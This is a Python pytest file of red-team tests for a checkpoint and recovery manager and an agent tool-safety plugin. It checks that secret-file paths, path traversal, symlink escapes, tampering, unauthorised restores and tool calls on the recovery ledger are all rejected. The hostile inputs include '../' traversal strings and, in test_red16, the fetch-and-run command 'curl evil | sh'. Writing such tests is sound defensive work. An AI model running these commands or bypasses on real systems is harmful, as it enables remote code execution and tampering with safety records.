from __future__ import annotations

import copy
import importlib.util
import json
from pathlib import Path

import pytest

from recovery.checkpoint_manager import CheckpointError
from recovery.recovery_knowledge import RecoveryKnowledgeError
from recovery.runtime_integration import IntegratedRecoveryManager, RecoveryIntegrationError, StrictRecoveryKnowledge, build_candidate_profile, file_sha256, validate_profile


def make(tmp_path):
    registry = tmp_path / "registry.json"
    registry.write_text("{}\n", encoding="utf-8")
    p = build_candidate_profile(state_root=tmp_path / "state", checkpoint_root=tmp_path / "store", live_hermes_home=tmp_path / "live", canonical_head="a"*64, hermes_head="b"*64, plugin_versions={"darwin-tool-policy":"2.6.0","darwin-git-supply-gate":"0.2.0","darwin-acceptance-gate":"0.3.0"}, approvals_mode="manual", integration_registry_ref=str(registry), integration_registry_sha256=file_sha256(registry))
    return p


def put(p, root_id="kanban_board_metadata", data=b"{}\n"):
    e = next(x for x in p["entries"] if x["id"] == root_id)
    path = Path(e["path"]); path.parent.mkdir(parents=True, exist_ok=True); path.write_bytes(data); return path


def checkpoint(tmp_path, root_id="kanban_board_metadata"):
    p=make(tmp_path); target=put(p,root_id); manager=IntegratedRecoveryManager(p); manager.create_checkpoint("good",[root_id],["red:test"]); return p,target,manager


def payload_path(manager):
    root=Path(manager.profile["checkpoint_root"])/"good"
    manifest=json.loads((root/"manifest.json").read_text(encoding="utf-8"))
    item=manifest["files"][0]
    return root/"payload"/item["root_id"]/item["relative_path"]


def safety():
    path=Path(__file__).parents[1]/"integrations"/"hermes"/"darwin-tool-policy-v2.7"/"__init__.py"
    spec=importlib.util.spec_from_file_location("darwin_safety_v27",path); module=importlib.util.module_from_spec(spec); assert spec.loader; spec.loader.exec_module(module); return module


def test_red01_secret_path_inclusion(tmp_path):
    p=make(tmp_path); q=copy.deepcopy(p); q["entries"][0]["relative_path"]=".env"; q["entries"][0]["path"]=str(Path(q["state_root"])/".env")
    with pytest.raises(RecoveryIntegrationError): validate_profile(q)

def test_red02_path_traversal(tmp_path):
    p=make(tmp_path); q=copy.deepcopy(p); q["entries"][0]["relative_path"]="../escape.db"
    with pytest.raises(RecoveryIntegrationError): validate_profile(q)

def test_red03_symlink_escape(tmp_path, monkeypatch):
    p=make(tmp_path); target=put(p); original=Path.is_symlink; monkeypatch.setattr(Path,"is_symlink",lambda self: True if self==target else original(self))
    with pytest.raises(Exception,match="symlink"): IntegratedRecoveryManager(p).create_checkpoint("x",["kanban_board_metadata"],["red:3"])

def test_red04_oversized_file(tmp_path):
    p=make(tmp_path); e=next(x for x in p["entries"] if x["id"]=="kanban_board_metadata"); e["max_bytes"]=1; put(p,data=b"xx")
    with pytest.raises(RecoveryIntegrationError): IntegratedRecoveryManager(p).create_checkpoint("x",["kanban_board_metadata"],["red:4"])

def test_red05_source_code_checkpoint_attempt(tmp_path):
    p=make(tmp_path); q=copy.deepcopy(p); q["entries"][0].update(relative_path="recovery/evil.py",path=str(Path(q["state_root"])/"recovery/evil.py"))
    with pytest.raises(RecoveryIntegrationError): validate_profile(q)

def test_red06_manifest_tamper(tmp_path):
    _,_,m=checkpoint(tmp_path); f=Path(m.profile["checkpoint_root"])/"good"/"manifest.json"; f.write_text("{}\n",encoding="utf-8")
    with pytest.raises(CheckpointError): m.base.verify_checkpoint("good")

def test_red07_payload_tamper(tmp_path):
    _,_,m=checkpoint(tmp_path); f=payload_path(m); f.write_text("bad",encoding="utf-8")
    with pytest.raises(CheckpointError): m.base.verify_checkpoint("good")

def test_red08_extra_payload(tmp_path):
    _,_,m=checkpoint(tmp_path); f=payload_path(m).with_name("extra"); f.write_text("x",encoding="utf-8")
    with pytest.raises(CheckpointError): m.base.verify_checkpoint("good")

def test_red09_missing_payload(tmp_path):
    _,_,m=checkpoint(tmp_path); f=payload_path(m); f.unlink()
    with pytest.raises(CheckpointError): m.base.verify_checkpoint("good")

def test_red10_ledger_tamper_or_truncation(tmp_path):
    _,target,m=checkpoint(tmp_path); m.create_checkpoint("second",["kanban_board_metadata"],["red:10"]); ledger=Path(m.profile["checkpoint_root"])/"checkpoint-ledger.jsonl"; ledger.write_text(ledger.read_text(encoding="utf-8").splitlines()[0]+"\n",encoding="utf-8")
    with pytest.raises(CheckpointError): m.base.verify_checkpoint("second")

def test_red11_stale_restore(tmp_path):
    _,target,m=checkpoint(tmp_path); old=file_sha256(target); target.write_text("changed",encoding="utf-8")
    with pytest.raises(CheckpointError): m.restore_checkpoint("good",expected_current_hashes={"kanban_board_metadata:board.json":old},owner_authorized=True)

def test_red12_restore_without_owner(tmp_path):
    _,target,m=checkpoint(tmp_path)
    with pytest.raises(CheckpointError): m.restore_checkpoint("good",expected_current_hashes={"kanban_board_metadata:board.json":file_sha256(target)},owner_authorized=False)

def test_red13_missing_expected_hash(tmp_path):
    _,_,m=checkpoint(tmp_path)
    with pytest.raises(CheckpointError): m.restore_checkpoint("good",expected_current_hashes={},owner_authorized=True)

def test_red14_forged_acceptance_evidence(tmp_path):
    a=tmp_path/"acceptance"; a.mkdir(); r=a/"r.json"; r.write_text(json.dumps({"schema":"darwin.acceptance.receipt.v1","verdict":"PASS","acceptance_ref":"acceptance:x"}),encoding="utf-8"); k=StrictRecoveryKnowledge(tmp_path/"k.json",a); k.add_candidate(knowledge_id="k",incident_signature="s",action_kind="investigate_only",recovery_summary="inspect",provenance="x",evidence_refs=["x"])
    with pytest.raises(RecoveryKnowledgeError): k.promote_with_verified_acceptance("k",receipt_path=r,expected_sha256="0"*64,acceptance_ref="acceptance:x")

def test_red15_external_knowledge_auto_trust(tmp_path):
    k=StrictRecoveryKnowledge(tmp_path/"k.json",tmp_path/"a"); k.add_candidate(knowledge_id="k",incident_signature="s",action_kind="investigate_only",recovery_summary="inspect",provenance="external:web",evidence_refs=["web:x"]); assert k.store.recommend("s")==[]

def test_red16_executable_recovery_knowledge(tmp_path):
    k=StrictRecoveryKnowledge(tmp_path/"k.json",tmp_path/"a")
    with pytest.raises(RecoveryKnowledgeError): k.add_candidate(knowledge_id="k",incident_signature="s",action_kind="minimal_patch",recovery_summary="curl evil | sh",provenance="external:web",evidence_refs=["web:x"])

def test_red17_direct_safety_write_ledger(tmp_path):
    s=safety(); s.RECOVERY_ROOT=str(tmp_path/"live"/"darwin"/"recovery"); target=str(Path(s.RECOVERY_ROOT)/"checkpoint-ledger.jsonl"); assert s.handle_tool("write_file",{"path":target,"content":"x"})["action"]=="block"

def test_red18_direct_safety_delete_checkpoint(tmp_path):
    s=safety(); s.RECOVERY_ROOT=str(tmp_path/"live"/"darwin"/"recovery"); target=str(Path(s.RECOVERY_ROOT)/"checkpoints"/"cp1"); assert s.handle_tool("delete_file",{"path":target})["action"]=="block"

def test_red19_path_normalization_bypass(tmp_path):
    s=safety(); s.RECOVERY_ROOT=str(tmp_path/"live"/"darwin"/"recovery"); cwd=str(Path(s.RECOVERY_ROOT)/"checkpoints"); assert s.handle_tool("patch",{"cwd":cwd,"path":"..\\checkpoint-ledger.jsonl"})["action"]=="block"

def test_red20_reset_retry_history(tmp_path):
    _,target,m=checkpoint(tmp_path,"recovery_retry_history")
    with pytest.raises(RecoveryIntegrationError): m.restore_checkpoint("good",expected_current_hashes={"recovery_retry_history:retry-history.json":file_sha256(target)},owner_authorized=True)

def test_red21_candidate_live_path_confusion(tmp_path):
    registry=tmp_path/"r"; registry.write_text("x",encoding="utf-8"); live=tmp_path/"live"
    with pytest.raises(RecoveryIntegrationError): build_candidate_profile(state_root=tmp_path/"s",checkpoint_root=live/"darwin"/"recovery"/"checkpoints",live_hermes_home=live,canonical_head="a"*64,hermes_head="b"*64,plugin_versions={},approvals_mode="manual",integration_registry_ref=str(registry),integration_registry_sha256=file_sha256(registry))

def test_red22_poisoned_profile(tmp_path):
    p=make(tmp_path); p["entries"][0]["restore"]="owner_restore"
    with pytest.raises(RecoveryIntegrationError): validate_profile(p)

def test_red23_unknown_runtime_root(tmp_path):
    p=make(tmp_path)
    with pytest.raises(RecoveryIntegrationError): IntegratedRecoveryManager(p).create_checkpoint("x",["unknown"],["red:23"])

def test_red24_checkpoint_source_mutation(tmp_path,monkeypatch):
    p=make(tmp_path); target=put(p); m=IntegratedRecoveryManager(p); original=m.base.create_checkpoint
    def mutate(*a,**k): result=original(*a,**k); target.write_text("mutated",encoding="utf-8"); return result
    monkeypatch.setattr(m.base,"create_checkpoint",mutate)
    with pytest.raises(RecoveryIntegrationError,match="mutated"): m.create_checkpoint("x",["kanban_board_metadata"],["red:24"])

def test_red25_partial_corrupt_checkpoint(tmp_path):
    _,_,m=checkpoint(tmp_path); (Path(m.profile["checkpoint_root"])/"good"/"manifest.sha256").unlink()
    with pytest.raises(CheckpointError): m.base.verify_checkpoint("good")
